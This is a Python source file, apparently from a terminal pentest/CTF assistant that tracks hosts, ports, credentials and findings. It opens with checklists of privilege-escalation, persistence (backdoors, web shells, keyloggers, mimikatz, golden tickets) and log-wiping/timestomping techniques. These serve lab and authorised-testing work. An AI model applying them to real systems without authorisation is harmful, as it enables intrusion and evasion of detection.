# the ones that keep showing up on HTB / OSCP / CTF; the 2nd field is the checklist family.
_OS_CHOICES = [
    ("Linux",          "linux"),
    ("Ubuntu",         "linux"),
    ("Debian",         "linux"),
    ("Windows",        "windows"),
    ("Windows Server", "windows"),
    ("Other / Unix",   "linux"),
]

# Privesc checklist per OS family (starter methodology — deeper pass later).
_PRIVESC_STEPS = {
    "linux": [
        ("Spawn a shell — pick a path across all exploited services", "spawn-shell"),
        "Automated enum (linpeas.sh / LinEnum.sh)",
        "sudo -l — sudo rights → GTFOBins",
        "SUID/SGID binaries (find / -perm -4000) → GTFOBins",
        "Capabilities (getcap -r /) → abuse",
        "Cron jobs & writable scripts / PATH hijack",
        "Writable /etc/passwd, /etc/shadow, service files",
        "Kernel version → known exploit (uname -a; searchsploit)",
        "Interesting files: configs, history, SSH keys, backups, .env",
        "Internal services / ports (ss -tlnp) → local exploit",
        "Password reuse & creds in files / process memory",
    ],
    "windows": [
        ("Spawn a shell — pick a path across all exploited services", "spawn-shell"),
        "Automated enum (winPEAS.exe / PrivescCheck)",
        "whoami /priv — token privileges (SeImpersonate → Potato)",
        "whoami /groups — group memberships",
        "Services: unquoted paths, weak perms, writable binaries",
        "AlwaysInstallElevated (HKLM + HKCU)",
        "Scheduled tasks & startup items with weak perms",
        "Stored creds: cmdkey, registry, Unattend.xml, SAM/SYSTEM",
        "OS build → known exploit (systeminfo; wesng / Sherlock)",
        "Autologon / SNMP / config files with passwords",
        "Token impersonation / named-pipe → SYSTEM",
    ],
}

# Persistence checklist per OS family (maintain access after a foothold / root).
_PERSIST_STEPS = {
    "linux": [
        "Add an SSH key to ~/.ssh/authorized_keys (root & users)",
        "Cron job — user crontab or /etc/cron.d for a callback",
        "systemd service / timer that re-establishes access",
        "New privileged user / add to sudoers (NOPASSWD)",
        "Shell rc backdoor (.bashrc / .profile / /etc/profile.d)",
        "SUID backdoor binary in a stable path",
        "rc.local / init script on boot",
        "PAM / SSH backdoor; capture creds (PAM, keylogger)",
        "Web shell in a served path (if a web app is present)",
        "Note & stash reusable creds for later re-entry",
    ],
    "windows": [
        "Add a local admin / add user to Administrators",
        "Registry Run keys (HKLM & HKCU …\\CurrentVersion\\Run)",
        "Scheduled task (schtasks) for a callback",
        "New service (sc create) running as SYSTEM",
        "Startup folder shortcut",
        "WMI event subscription (fileless)",
        "Accessibility backdoor (sethc / utilman) at logon screen",
        "Enable RDP + user for interactive re-entry",
        "AD: DCSync / golden / silver ticket (domain persistence)",
        "Dump creds (mimikatz) & pass-the-hash for re-entry",
    ],
}

# Covering-tracks checklist per OS family (authorised-engagement cleanup / anti-forensics).
_COVER_STEPS = {
    "linux": [
        "Clear shell history (~/.bash_history, HISTFILE; unset HISTFILE)",
        "Scrub log entries (auth.log, syslog, wtmp/btmp/lastlog)",
        "Timestomp touched files (touch -r reference / -t)",
        "Remove dropped tools, payloads and temp files",
        "Remove artifacts you added (cron/at, keys, users) when done",
        "Clear/limit auditing (auditd rules, .bash_logout)",
        "Close sessions cleanly; note what was changed for the report",
    ],
    "windows": [
        "Clear PowerShell history (ConsoleHost_history.txt)",
        "Clear event logs (wevtutil cl …) — noisy, note it",
        "Timestomp touched files (SetMACE / PowerShell)",
        "Remove dropped tools, payloads and temp artifacts",
        "Delete Prefetch / Recent / Run-MRU traces",
        "Remove added users, tasks and services when done",
        "Note tampered logging (Sysmon/ETW) for the report",
    ],
}


def _os_family(text: "str | None") -> str:
    """Map an OS string (nmap's guess or the user's pick) to a checklist family."""
    return "windows" if text and "windows" in text.lower() else "linux"


def _select_os(ip: str) -> "tuple | None":
    """Prompt for the host OS and remember the choice. Returns (label, family) or None."""
    print(f"\n{BOLD}Select OS for {ip}{RESET}  {DIM}(pick the target's OS){RESET}")
    for i, (label, _fam) in enumerate(_OS_CHOICES, 1):
        print(f"  {CYAN}{i}{RESET} {label}")
    while True:
        v = _ctx_ask("os", f"<1-{len(_OS_CHOICES)}> · [b] back")
        if v is None or v.lower() in _BACK_WORDS:
            return None
        if v.isdigit() and 1 <= int(v) <= len(_OS_CHOICES):
            label, fam = _OS_CHOICES[int(v) - 1]
            save_os(ip, label)                 # remember it on the host record
            return label, fam
        print(f"{RED}✗ pick 1-{len(_OS_CHOICES)}{RESET}")


def _render_os_checklist(ip: str, kind: str, title: str, steps_map: dict,
                         family: str, os_label: str) -> None:
    """One OS-family checklist (privesc / persistence) for a host, by family."""
    steps = steps_map.get(family, steps_map["linux"])
    status = fetch_step_status(ip, 0, "", f"{kind}:{family}")
    print(f"\n{BOLD}{title} — checklist{RESET}  {DIM}{ip} · {os_label}{RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, tool_key = _step_parts(step)
        st = status.get(i)
        sym, col = _STEP_MARK.get(st, _STEP_MARK[None])
        has_tool = bool(tool_key and tool_key in _STEP_TOOLS)
        text = f"{BOLD}{desc}{RESET}" if has_tool else desc      # wired (runnable) → bold
        body = f"{col}{text}{RESET}" if st in ("done", "skip") else text
        print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")
        if has_tool:
            print(f"        {DIM}→ {_step_run_line(tool_key)}  ·  run with {BOLD}r {i}{RESET}")


def _os_checklist_view(ip: str, kind: str, title: str, steps_map: dict,
                       family: str, os_label: str) -> None:
    """Interactive OS-family checklist: <n> done, s <n> skip, o change OS. Status is saved
    (port 0, service '<kind>:<family>') so it survives across sessions."""
    cur = {"family": family, "label": os_label}        # mutable so [o] can switch it live

    def _toggle(n, want):
        steps = steps_map.get(cur["family"], steps_map["linux"])
        if not 1 <= n <= len(steps):
            print(f"{RED}✗ no step {n}{RESET}")
            return
        svc = f"{kind}:{cur['family']}"
        prev = fetch_step_status(ip, 0, "", svc).get(n)
        set_step_status(ip, 0, "", svc, n, None if prev == want else want)

    def _run(n):
        steps = steps_map.get(cur["family"], steps_map["linux"])
        if not 1 <= n <= len(steps):
            print(f"{RED}✗ no step {n}{RESET}")
            return
        _desc, tool_key = _step_parts(steps[n - 1])
        if not tool_key or tool_key not in _STEP_TOOLS:
            print(f"{DIM}step {n} has no tool — do it manually{RESET}")
            return
        svc = f"{kind}:{cur['family']}"
        prev = fetch_step_status(ip, 0, "", svc).get(n)
        set_step_status(ip, 0, "", svc, n, "running")
        try:
            _STEP_TOOLS[tool_key][1](ip, 0, "")        # interactive foreground (spawns in a new tab)
        except Exception as exc:                       # noqa: BLE001
            print(f"{RED}✗ {tool_key} error: {exc}{RESET}")
            set_step_status(ip, 0, "", svc, n, prev)
            return
        set_step_status(ip, 0, "", svc, n, "done")

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "o":
            picked = _select_os(ip)                    # also saves the new OS on the host
            if picked:
                cur["label"], cur["family"] = picked
            return "refresh"
        if v.startswith("s") and v[1:].strip().isdigit():
            _toggle(int(v[1:].strip()), "skip")
            return "refresh"
        if v.startswith("r") and v[1:].strip().isdigit():
            _run(int(v[1:].strip()))
            return "stay"                              # just the launch/interaction (no redraw)
        if v.isdigit():
            _toggle(int(v), "done")
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> done · s <n> skip · r <n> run · o · b{RESET}")
        return "stay"

    _run_view(f"{ip} {kind}",
              "[Enter] refresh · <n> done · s <n> skip · r <n> run · [o] change OS · [b] back · [m] menu",
              lambda: _render_os_checklist(ip, kind, title, steps_map, cur["family"], cur["label"]),
              _handle)


def _os_checklist_for(ip: str, kind: str, title: str, steps_map: dict) -> None:
    """Open an OS-family checklist for a known host: use the OS on record, or ask for it."""
    os_db = fetch_host_os(ip)
    if os_db:
        _os_checklist_view(ip, kind, title, steps_map, _os_family(os_db), os_db)
        return
    picked = _select_os(ip)
    if picked:
        _os_checklist_view(ip, kind, title, steps_map, picked[1], picked[0])


def _os_checklist_progress(ip: str, kind: str, steps_map: dict) -> tuple:
    """(complete, detail) for an OS-family phase in progress. Not started until an OS is on
    record; complete once every step is resolved (done/skip)."""
    os_db = fetch_host_os(ip)
    if not os_db:
        return False, ""
    family = _os_family(os_db)
    steps = steps_map.get(family, steps_map["linux"])
    status = fetch_step_status(ip, 0, "", f"{kind}:{family}")
    n_done = sum(1 for i in range(1, len(steps) + 1) if status.get(i) in ("done", "skip"))
    return n_done == len(steps), f"{n_done}/{len(steps)} steps · {family}"


def _handle_os_checklist(title: str, kind: str, steps_map: dict) -> None:
    """Menu flow for an OS-family phase: read a target IP, then work its checklist."""
    while True:
        value = _ctx_ask(kind, "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        _os_checklist_for(ip, kind, title, steps_map)
        return


def _handle_privesc() -> None:
    _handle_os_checklist("Privilege Escalation", "privesc", _PRIVESC_STEPS)


def _handle_persist() -> None:
    _handle_os_checklist("Persistence", "persist", _PERSIST_STEPS)


def _handle_cover() -> None:
    _handle_os_checklist("Covering Tracks", "cover", _COVER_STEPS)


# ── placeholder handlers (skeleton — nothing is wired yet) ────────────────────
def _todo(title: str) -> None:
    """Uniform 'not implemented yet' notice for a skeleton screen."""
    print(f"\n{MAGENTA}▸ {title}{RESET}")
    print(f"  {YELLOW}[skeleton]{RESET} {DIM}not wired yet — engine coming soon{RESET}")


def run_phase(key: str) -> None:
    name = _PHASES[key][0]
    _todo(name)


# state -> (colour, label) shown in each status row
_STATE_LABEL = {"running": (YELLOW, "running"), "done": (GREEN, "complete"),
                "error": (RED, "error"), "aborted": (MAGENTA, "aborted")}


def _status_groups(jobs: list) -> list:
    """Group jobs of one phase execution (same run id) into one entry — a phase launches
    its parallel commands together, so they share a number and sit beneath each other.
    Each separate execution keeps its own number, even for the same phase re-run."""
    groups: list = []
    index: dict = {}                      # run id -> its group, to keep runs distinct
    for j in jobs:
        run = j.get("run") or f"job{id(j)}"
        if run in index:
            index[run].append(j)
        else:
            g = [j]
            index[run] = g
            groups.append(g)
    return groups


def show_status() -> list:
    """Command history, grouped by phase: each entry shows its number, the phase name,
    the combined state (running/complete/error/aborted) and a short found yes/no; the
    phase's command(s) sit beneath it. Returns the ordered groups so the caller can
    stop / view one by number."""
    with _JOBS_LOCK:
        jobs = list(_JOBS)
    print(f"\n{BOLD}Status{RESET}")
    if not jobs:
        print(f"  {DIM}no commands have run yet{RESET}")
        return []
    groups = _status_groups(jobs)
    for n, g in enumerate(groups, 1):
        title = _PHASES.get(g[0]["phase"], (g[0]["name"],))[0]
        if g[0]["phase"] == "5":                     # name which service is being exploited
            title = f"{title} {DIM}—{RESET}{BOLD} {g[0]['name']}"
        state = _agg_state([j["state"] for j in g])
        colour, text = _STATE_LABEL.get(state, (DIM, state))
        found = f"{GREEN}yes{RESET}" if any(j["hosts"] > 0 for j in g) else f"{DIM}no{RESET}"
        multi = len(g) > 1
        tail = f"  {DIM}·{RESET} {DIM}{len(g)} cmds{RESET}" if multi else ""
        print(f"  {CYAN}{n}{RESET} {BOLD}{title}{RESET}  "
              f"{DIM}·{RESET} {colour}{text}{RESET}  {DIM}·{RESET} found: {found}{tail}")
        for j in g:
            if multi:                                    # per-command state so a partly
                jc, jt = _STATE_LABEL.get(j["state"], (DIM, j["state"]))   # done phase is clear
                print(f"       {jc}{jt:<8}{RESET} {DIM}{j['command']}{RESET}")
            else:
                print(f"       {DIM}{j['command']}{RESET}")
            if j["error"]:
                print(f"       {RED}{j['error']}{RESET}")
    return groups


def _cell(value: "str | None", width: int) -> str:
    """Fit a value into a fixed-width column: '—' when missing, truncated with '…'
    when longer than ``width`` so long vendor/OS/hostname strings can't break the
    table layout."""
    s = value if value else "—"
    return s if len(s) <= width else s[:width - 1] + "…"


def _vwidth(s: str) -> int:
    """Visible width of a string — ANSI colour codes don't count."""
    return len(re.sub(r"\x1b\[[0-9;]*m", "", s))


def _box_table(headers: list, rows: list, aligns: "list | None" = None,
               indent: str = "  ") -> str:
    """Render a box-drawing table. Cells may contain ANSI colour codes — column widths
    and padding use the visible width so the borders stay aligned. ``aligns`` is 'l'/'r'
    per column (default left)."""
    n = len(headers)
    aligns = aligns or ["l"] * n
    w = [_vwidth(h) for h in headers]
    for r in rows:
        for i in range(n):
            w[i] = max(w[i], _vwidth(r[i]) if i < len(r) else 0)

    def pad(s, i):
        gap = " " * max(0, w[i] - _vwidth(s))
        return gap + s if aligns[i] == "r" else s + gap

    bar = f"{DIM}│{RESET}"

    def rule(left, mid, right):
        return f"{indent}{DIM}{left}" + mid.join("─" * (w[i] + 2) for i in range(n)) + f"{right}{RESET}"

    out = [rule("┌", "┬", "┐"),
           indent + bar + bar.join(f" {BOLD}{pad(headers[i], i)}{RESET} " for i in range(n)) + bar,
           rule("├", "┼", "┤")]
    for r in rows:
        out.append(indent + bar + bar.join(f" {pad(r[i] if i < len(r) else '', i)} " for i in range(n)) + bar)
    out.append(rule("└", "┴", "┘"))
    return "\n".join(out)


def show_database() -> list:
    """Discovered hosts: IP / MAC / vendor / OS / hostname where known. Long values
    are truncated so the table stays aligned. Returns the ordered rows so the caller
    can delete one by its number."""
    rows = fetch_hosts()
    print(f"\n{BOLD}Database — hosts{RESET}")
    if not rows:
        print(f"  {DIM}empty — no hosts discovered yet{RESET}")
        return rows
    trows = [[str(i), ip or "—", _cell(mac, 17), _cell(vendor, 16), _cell(os_, 20),
              _cell(hostname, 24), str(nports) if nports else "—"]
             for i, (ip, mac, vendor, hostname, os_, nports) in enumerate(rows, 1)]
    print(_box_table(["#", "IP", "MAC", "VENDOR", "OS", "HOSTNAME", "PORTS"], trows,
                     aligns=["r", "l", "l", "l", "l", "l", "r"]))
    return rows


def _delete_host(rows: list, n: int) -> None:
    """Remove one host (by its list number) and everything tied to it — ports, services,
    scripts, vulns and its command-history jobs — from the database."""
    if not 1 <= n <= len(rows):
        print(f"{RED}✗ no host {n}{RESET}")
        return
    ip = rows[n - 1][0]
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for table in ("hosts", "ports", "services", "scripts", "vulns", "exploit_steps", "hostnames"):
                conn.execute(f"DELETE FROM {table} WHERE ip = ?", (ip,))
            conn.commit()
        finally:
            conn.close()
    # also drop this host's command history: jobs that name the IP as a whole token
    # (subnet-discovery jobs don't match, so a shared scope scan is left intact).
    pat = re.compile(r"(?<!\d)" + re.escape(ip) + r"(?!\d)")
    with _JOBS_LOCK:
        gone = [j for j in _JOBS
                if pat.search(j.get("command") or "") or pat.search(j.get("name") or "")]
        gone_ids = {id(j) for j in gone}
        for j in gone:
            if j["state"] == "running":
                j["cancel"].set()             # stop any in-flight scan for this host
        _JOBS[:] = [j for j in _JOBS if id(j) not in gone_ids]
        for j in _JOBS:                       # discovery jobs must forget this host too,
            j["found"].discard(ip)            # or progress would still credit phase 1
    ids = [(j["db_id"],) for j in gone if j.get("db_id") is not None]
    if ids:
        with _DB_LOCK:
            conn = _db_connect()
            try:
                conn.executemany("DELETE FROM jobs WHERE id = ?", ids)
                conn.commit()
            finally:
                conn.close()
    tail = f" {DIM}(+{len(gone)} history entr{'y' if len(gone) == 1 else 'ies'}){RESET}" if gone else ""
    print(f"{GREEN}✓ removed {ip}{RESET}{tail}")


def _render_host_ports(ip: str) -> list:
    """Print one host's numbered open ports / protocol / state / service / version
    (plus its OS when detected). Returns the ordered ports so the caller can open a
    port's NSE (-sC) output by number."""
    ports = fetch_ports(ip)
    services = fetch_services(ip)
    os_ = fetch_host_os(ip)
    head = f"\n{BOLD}{ip} — ports{RESET}"
    if os_:
        head += f"  {DIM}· OS:{RESET} {os_}"
    print(head)
    if not ports:
        print(f"  {DIM}none{RESET}")
        return ports
    vulns = fetch_vulns(ip)
    flagged = {(v[0], v[1]) for v in vulns}          # (port, proto) with a finding
    scripted = fetch_scripted_ports(ip)              # (port, proto) that have script output
    trows = []
    for i, (port, proto, state) in enumerate(ports, 1):
        name, product, version, _cpe = services.get((port, proto), (None, None, None, None))
        ver = " ".join(x for x in (product, version) if x) or "—"
        verlen = 48 if (port, proto) in flagged else 28   # ports with findings show fuller VERSION
        more = "›" if (port, proto) in scripted else "—"  # is there more to see for this port?
        trows.append([str(i), str(port), proto, state or "—",
                      _cell(name, 15), _cell(ver, verlen), more])
    print(_box_table(["#", "PORT", "PROTO", "STATE", "SERVICE", "VERSION", "MORE"], trows,
                     aligns=["r", "r", "l", "l", "l", "l", "l"]))
    return ports


_VALID_PORT_STATES = {"open", "closed", "filtered", "unfiltered",
                      "open|filtered", "closed|filtered"}


def _ask_port_proto():
    """Prompt for a port + protocol. Returns (port, proto) or None on a bad/blank value."""
    pv = _ask("port [1-65535]:")
    if not pv or not pv.isdigit() or not 1 <= int(pv) <= 65535:
        print(f"{RED}✗ need a port 1-65535{RESET}")
        return None
    pr = (_ask("proto [tcp/udp, default tcp]:") or "tcp").lower()
    if pr not in ("tcp", "udp"):
        print(f"{RED}✗ proto must be tcp or udp{RESET}")
        return None
    return int(pv), pr


def _manual_add_port(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    state = (_ask("state [open/filtered/closed, default open]:") or "open").lower()
    if state not in _VALID_PORT_STATES:
        print(f"{RED}✗ state must be one of: {', '.join(sorted(_VALID_PORT_STATES))}{RESET}")
        return
    name = _ask("service name (optional, e.g. http):") or None
    row = {"port": port, "proto": proto, "state": state}
    if name:
        row["service"] = {"name": name}
    save_ports(ip, [row], source="manual")
    print(f"{GREEN}✓ added {port}/{proto} ({state}) on {ip}{RESET}")


def _manual_add_service(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    name = _ask("service name (e.g. http, ssh):") or None
    product = _ask("product (e.g. Apache httpd, optional):") or None
    version = _ask("version (e.g. 2.4.51, optional):") or None
    if not (name or product or version):
        print(f"{RED}✗ give at least a name, product or version{RESET}")
        return
    save_ports(ip, [{"port": port, "proto": proto, "state": "open"}], source="manual")
    save_services(ip, [{"port": port, "proto": proto, "name": name,
                        "product": product, "version": version}], source="manual")
    print(f"{GREEN}✓ set service {name or ''} {product or ''} {version or ''} on "
          f"{port}/{proto}{RESET}{DIM} — run vuln-scan / exploit to use it{RESET}")


def _manual_add_hostname(ip: str) -> None:
    hn = _ask("hostname / vhost (e.g. admin.target.htb):")
    if not hn:
        return
    if not _valid_hostname(hn, ip):
        print(f"{RED}✗ not a usable DNS name{RESET}")
        return
    save_hostnames(ip, [{"hostname": hn, "source": "manual", "port": 0}])
    where = " → added to /etc/hosts" if _is_root() else " (run under sudo to auto-add to /etc/hosts)"
    print(f"{GREEN}✓ added vhost {hn.strip().lower()}{RESET}{DIM}{where}{RESET}")


def _manual_add_cred(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    host = _ask(f"host/vhost [default {ip}]:") or ip
    user = _ask("username:")
    if not user:
        print(f"{RED}✗ need a username{RESET}")
        return
    pw = _ask("password (blank allowed):") or ""
    path = _ask("login path [default /]:") or "/"
    kind = (_ask("kind [form/Basic, default form]:") or "form")
    kind = "Basic" if kind.lower() == "basic" else "form"
    save_ports(ip, [{"port": port, "proto": proto, "state": "open"}])
    add_manual_cred(ip, port, proto, host, user, pw, path, kind)
    print(f"{GREEN}✓ stored creds {user}:{pw or '<blank>'} @ {path} ({kind}) on "
          f"{port}/{proto}{RESET}{DIM} — admin-rce / idor / foothold will reuse them{RESET}")


def _manual_add_path(ip: str) -> None:
    pp = _ask_port_proto()
    if not pp:
        return
    port, proto = pp
    host = _ask(f"host/vhost [default {ip}]:") or ip
    path = _ask("path / page (e.g. /admin or /api/users?id=1):")
    if not path:
        print(f"{RED}✗ need a path{RESET}")
        return
    if not path.startswith("/"):
        m = re.match(r"https?://[^/]+(/\S*)", path)          # tolerate a full URL
        if not m:
            print(f"{RED}✗ path must start with / (or be a full URL){RESET}")
            return
        path = m.group(1)
    save_ports(ip, [{"port": port, "proto": proto, "state": "open"}])
    add_manual_path(ip, port, proto, host, path)
    print(f"{GREEN}✓ stored path {path} on {port}/{proto}{RESET}{DIM} — the HTTP tools "
          f"(param/idor/upload/xxe/priv) will probe it{RESET}")


def _manual_add(ip: str) -> None:
    """Sub-menu (opened with [a] in a host's findings): add surface the scanner missed —
    a port, a service, a vhost, credentials, or a path — attached to this host."""
    print(f"\n{BOLD}Add finding for {ip}{RESET}")
    print(f"  {BOLD}1{RESET}  port")
    print(f"  {BOLD}2{RESET}  service {DIM}(name / product / version){RESET}")
    print(f"  {BOLD}3{RESET}  hostname / vhost")
    print(f"  {BOLD}4{RESET}  credentials")
    print(f"  {BOLD}5{RESET}  path / page")
    choice = _ask("add [1-5] (blank to cancel):")
    fn = {"1": _manual_add_port, "2": _manual_add_service, "3": _manual_add_hostname,
          "4": _manual_add_cred, "5": _manual_add_path}.get((choice or "").strip())
    if fn:
        fn(ip)
    elif choice:
        print(f"{RED}✗ pick 1-5{RESET}")


def _manual_add_host() -> None:
    """Add a whole host the scan never saw (from a scope doc / another box). Opened with
    [a] in the database view. Optional MAC/vendor/hostname/OS can be filled in too."""
    ipv = _ask("host IP:")
    if not ipv:
        return
    try:
        ip = str(ipaddress.ip_address(ipv))
    except ValueError:
        print(f"{RED}✗ not a valid IP address{RESET}")
        return
    if _is_self_ip(ip):
        print(f"{RED}✗ refusing to add your own / loopback address{RESET}")
        return
    hostname = _ask("hostname (optional):") or None
    os_ = _ask("OS (optional, e.g. Linux / Windows):") or None
    vendor = _ask("vendor (optional):") or None
    save_hosts([{"ip": ip, "hostname": hostname, "os": os_, "vendor": vendor}])
    print(f"{GREEN}✓ added host {ip}{RESET}{DIM} — open it and add its ports/services next{RESET}")


def _db_exec(query: str, params: tuple = ()) -> None:
    """Run a single write statement under the DB lock (create schema if needed)."""
    with _DB_LOCK:
        conn = _db_connect()
        try:
            conn.execute(query, params)
            conn.commit()
        finally:
            conn.close()


def _remove_manual_line(ip: str, port: int, proto: str, sid: str, host: str, line: str) -> None:
    """Drop one line from a manual-creds / manual-paths script row; delete the row if empty."""
    blocks = _load_manual_block(ip, port, proto, sid)
    if line in blocks.get(host, []):
        blocks[host].remove(line)
        if not blocks[host]:
            del blocks[host]
    if any(blocks.values()):
        _save_manual_block(ip, port, proto, sid, blocks)
    else:
        _db_exec("DELETE FROM scripts WHERE ip=? AND port=? AND proto=? AND script=?",
                 (ip, port, proto, sid))


def _gather_manual_items(ip: str) -> list:
    """Every user-entered item for a host — manual ports/services/vhosts/creds/paths —
    as {kind, label, …} dicts, so the remove view can list and delete them by number."""
    items = []
    for port, proto, state in _fetch(
            "SELECT port, proto, state FROM ports WHERE ip=? AND source='manual' "
            "ORDER BY port", (ip,)):
        items.append({"kind": "port", "port": port, "proto": proto,
                      "label": f"port   {port}/{proto} {state or ''}".rstrip()})
    for port, proto, name, product, version in _fetch(
            "SELECT port, proto, name, product, version FROM services "
            "WHERE ip=? AND source='manual' ORDER BY port", (ip,)):
        desc = " ".join(x for x in (name, product, version) if x) or "—"
        items.append({"kind": "service", "port": port, "proto": proto,
                      "label": f"svc    {port}/{proto} {desc}"})
    for hn, _p, source in fetch_hostnames(ip):
        if source == "manual":
            items.append({"kind": "vhost", "hostname": hn, "label": f"vhost  {hn}"})
    for port, proto, sid, output in fetch_manual(ip):
        host = ip
        for ln in (output or "").splitlines():
            mh = re.match(r"^\[([^\]\s]+)\]\s*$", ln)
            if mh:
                host = mh.group(1)
                continue
            if sid == "manual-creds":
                mc = re.match(r"! (\S+):(\S+) @ (\S+) \(([^)]+)\)", ln)
                if mc:
                    pw = "" if mc.group(2) == "<blank>" else mc.group(2)
                    items.append({"kind": "cred", "port": port, "proto": proto, "host": host,
                                  "line": ln, "label": f"cred   {port}/{proto} "
                                  f"{mc.group(1)}:{pw} @ {mc.group(3)}"})
            else:
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp:
                    tag = "" if host == ip else f" [{host}]"
                    items.append({"kind": "path", "port": port, "proto": proto, "host": host,
                                  "line": ln, "label": f"path   {port}/{proto} {mp.group(1)}{tag}"})
    return items


def _delete_manual_item(ip: str, item: dict) -> None:
    """Remove one manual item (guarded to source='manual' rows so a scanned finding is safe)."""
    kind = item["kind"]
    if kind in ("port", "service"):
        if kind == "port":                       # dropping the port drops its manual service too
            _db_exec("DELETE FROM ports WHERE ip=? AND port=? AND proto=? AND source='manual'",
                     (ip, item["port"], item["proto"]))
        _db_exec("DELETE FROM services WHERE ip=? AND port=? AND proto=? AND source='manual'",
                 (ip, item["port"], item["proto"]))
    elif kind == "vhost":
        _db_exec("DELETE FROM hostnames WHERE ip=? AND hostname=? AND source='manual'",
                 (ip, item["hostname"]))
        _sync_hosts_block(ip)                    # keep the managed /etc/hosts block current
    elif kind in ("cred", "path"):
        sid = "manual-creds" if kind == "cred" else "manual-paths"
        _remove_manual_line(ip, item["port"], item["proto"], sid, item["host"], item["line"])


def _manual_remove(ip: str) -> None:
    """Sub-view (opened with [r]): list what the user entered by hand for this host and
    delete entries by number. Only source='manual' rows are touched — scanned findings
    are never listed or removed here."""
    def _render():
        items = _gather_manual_items(ip)
        print(f"\n{BOLD}{ip} — remove manual entries{RESET}")
        if not items:
            print(f"  {DIM}nothing entered manually for this host{RESET}")
        else:
            for i, it in enumerate(items, 1):
                print(f"  {BOLD}{i:>2}{RESET}  {it['label']}")
        return items

    def _handle(items, v):
        if v == "":
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(items):
                it = items[n - 1]
                _delete_manual_item(ip, it)
                print(f"{GREEN}✓ removed {it['label'].strip()}{RESET}")
                return "refresh"
            print(f"{RED}✗ no entry {n}{RESET}")
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> remove · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/manual", "[Enter] refresh · <n> remove · [b] back", _render, _handle)


def _render_host_findings(ip: str) -> None:
    """The host's findings, opened with [f]: short one-line summaries — the FINDINGS list
    (incl. phase-4 vuln and phase-6 tool results) and the aggregated CVE list — plus the
    raw host-level NSE output (HOST FINDINGS). Per-port tool output lives in each port's
    DETAILS view, not here."""
    _sync_hosts_block(ip)     # viewing a host's findings as root materialises its DB domains → hosts
    vulns = fetch_vulns(ip)
    host_scripts = fetch_scripts(ip, 0, "")
    hostnames = fetch_hostnames(ip)
    manual = fetch_manual(ip)
    # short summaries: everything except the CVE-lookup rows (those get their own section)
    findings = [v for v in vulns if v[3] != "CVE"]
    cve_map = {}                                     # CVE → set of "port/proto" it was seen on
    for port, proto, _script, _state, cve, _risk, _summary in vulns:
        for c in (cve or "").split(","):
            c = c.strip()
            if c:
                cve_map.setdefault(c, set()).add(f"{port}/{proto}")

    print(f"\n{BOLD}{ip} — findings{RESET}")
    if not findings and not cve_map and not host_scripts and not hostnames and not manual:
        print(f"  {DIM}none{RESET}")
        return
    if manual:
        print(f"\n  {BOLD}MANUAL{RESET}  {DIM}(entered by you — feeds the scans/tools){RESET}")
        for mport, mproto, sid, output in manual:
            if sid == "manual-creds":
                for m in re.finditer(r"! (\S+):(\S+) @ (\S+) \(([^)]+)\)", output or ""):
                    pw = "" if m.group(2) == "<blank>" else m.group(2)
                    print(f"    {YELLOW}cred{RESET}  {mport}/{mproto:<5}"
                          f"{_cell(f'{m.group(1)}:{pw} @ {m.group(3)} ({m.group(4)})', 60)}")
            else:                                    # manual-paths
                host = ip
                for ln in (output or "").splitlines():
                    mh = re.match(r"^\[([^\]\s]+)\]\s*$", ln)
                    if mh:
                        host = mh.group(1)
                        continue
                    mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                    if mp:
                        tag = "" if host == ip else f"  {DIM}[{host}]{RESET}"
                        print(f"    {CYAN}path{RESET}  {mport}/{mproto:<5}"
                              f"{_cell(mp.group(1), 50)}{tag}")
    if hostnames:
        note = ("auto-synced to /etc/hosts (removed on exit)" if _is_root()
                else "no sudo — not in /etc/hosts; paste the line below")
        print(f"\n  {BOLD}HOSTNAMES{RESET}  {DIM}({note}){RESET}")
        for hn, _port, source in hostnames:
            print(f"    {CYAN}{hn}{RESET}  {DIM}{source}{RESET}")
        if not _is_root():
            snip = _hosts_snippet(ip)
            if snip:
                print(f"    {DIM}$ {snip}{RESET}")
    if findings:
        print(f"\n  {BOLD}FINDINGS{RESET}")
        for port, proto, script, state, cve, risk, summary in findings:
            col = RED if state in ("VULNERABLE", "LIKELY") else \
                (YELLOW if state == "EXPOSED" else DIM)
            print(f"    {col}{state:<11}{RESET}{port}/{proto:<5}"
                  f"{_cell(summary or script, 60)}")
    if cve_map:
        kev = _load_kev()
        ordered = sorted(cve_map, key=_cve_sort_key)     # newest first
        kev_hits = [c for c in ordered if c in kev]
        rest = [c for c in ordered if c not in kev]
        print(f"\n  {BOLD}CVE{RESET}")

        def _group(title, cves, col):
            print(f"    {title}")
            if cves:
                for c in cves:
                    print(f"      {col}{c}{RESET}  {DIM}{', '.join(sorted(cve_map[c]))}{RESET}")
            else:
                print(f"      {DIM}none{RESET}")

        _group(f"{BOLD}⚑ KEV CVE — known exploited{RESET}", kev_hits, RED)   # header neutral, CVEs red
        _group(f"{BOLD}other CVE{RESET}", rest, DIM)                          # rest → grey
    if host_scripts:
        print(f"\n  {BOLD}HOST FINDINGS{RESET}")
        for script, output in host_scripts:
            print(f"    {CYAN}{script}{RESET}")
            for line in (output or "").strip().split("\n"):
                print(f"        {line.rstrip()}")


def _render_port_scripts(ip: str, port: int, proto: str) -> None:
    """Print the full collected output for one port — every tool's raw result: service
    detection (-sC), the vuln scan (phase 4) and service exploitation (phase 6). The short
    one-line takeaways are summarised separately in [f] findings, not repeated here."""
    rows = fetch_scripts(ip, port, proto)          # all tools' output stored for this port
